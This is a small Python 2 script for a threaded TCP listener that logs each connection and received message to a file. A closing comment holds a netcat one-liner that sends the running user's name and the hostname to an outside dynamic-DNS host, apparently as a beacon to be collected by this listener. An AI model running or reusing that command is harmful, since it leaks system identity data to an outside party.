import socket
import threading
import sys
import datetime

BIND_IP = '0.0.0.0'
BIND_PORT = 12345
FILE_NAME = "logs"

def time_now():
    return str(datetime.datetime.now())

def write_new_line(file_name, content):
    with open(FILE_NAME, "a") as out:
        out.write("\n")
        out.write(content)

def handle_client(client_socket):
    request = client_socket.recv(1024)
    mesg = "Received: " + request
    print "[*] " + mesg
    write_new_line(FILE_NAME, mesg + "\n")
    client_socket.send('ACK')
    client_socket.close()

def tcp_server():
    server = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    server.bind(( BIND_IP, BIND_PORT))
    server.listen(5)
    print"[*] Listening on %s:%d" % (BIND_IP, BIND_PORT)

    while 1:
        client, addr = server.accept()
        mesg = "[*] Accepted connection from: %s:%d" %(addr[0], addr[1])
        print "[*] " + mesg
	write_new_line(FILE_NAME, "[*] " + time_now() + "\n" + mesg)
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()
	rpns = "halo!!"
	client.send(rpns)
	write_new_line(FILE_NAME, "[*] send: " + rpns)
	client.close()

if __name__ == '__main__':
    tcp_server()

# echo "$(whoami):$(hostname)" | nc pipeter.asuscomm.com 9090

